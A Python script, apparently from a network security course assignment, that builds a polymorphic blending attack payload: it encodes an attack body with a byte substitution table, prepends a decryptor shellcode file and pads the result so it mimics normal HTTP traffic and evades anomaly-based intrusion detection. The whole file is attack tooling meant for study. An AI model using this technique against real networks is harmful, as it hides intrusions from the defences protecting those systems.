#!/usr/bin/env python3

import struct
from collections import Counter
from substitution import *
from padding import *

ARTIFICIAL_PATH = "http_artificial_profile.pcap"
ATTACKBODY_PATH = "YOUR_GTUSERNAME.pcap" # replace the file name by the one you downloaded

if __name__ == '__main__':
    attack_payload_bytes = getAttackBodyPayload(ATTACKBODY_PATH)
    artificial_payload_bytes = getArtificialPayload(ARTIFICIAL_PATH)
    artificial_payload = artificial_payload_bytes.decode("utf8")
    attack_payload = attack_payload_bytes.decode("utf8")
    
    # Generate substitution table based on byte frequency in file
    substitution_table = getSubstitutionTable(artificial_payload, attack_payload)

    # Substitution table will be used to encrypt attack body and generate corresponding
    # xor_table which will be used to decrypt the attack body
    (xor_table, adjusted_attack_body) = substitute(attack_payload, substitution_table)

    # For xor operation, should be a multiple of 4
    while len(xor_table) < 128:
        # CHECK: 128 can be some other number (greater than and multiple of 4)
        # per your attack trace length
        xor_table.append(chr(0))

    # For xor operation, should be a multiple of 4
    while len(adjusted_attack_body) < 128:
        # CHECK: 128 can be some other number (greater than and multiple of 4) per
        # your attack trace length
        adjusted_attack_body.append(chr(0))

    # Read in decryptor binary to append at the start of payload
    # Prepare byte list for payload

    with open("shellcode.bin", mode='rb') as file:
        shellcode_content = file.read()

    b_list = []
    for b in shellcode_content:
        b_list.append(chr(b))

    # Raw payload will be constructed by encrypted attack body and xor_table
    raw_payload = b_list + adjusted_attack_body + xor_table
    
    while len(raw_payload) < len(artificial_payload):
        padding(artificial_payload, raw_payload)

    # Write prepared payload to Output file
    with open("output", "wb") as result_file:
        result_file.write(bytearray("".join(raw_payload), "utf8"))
        
    # Write code here to generate payload.bin!
    # with open("payload.bin", "wb") as payload_file:
    #     payload_file.write(bytearray("".join(adjusted_attack_body + xor_table), "utf8"))
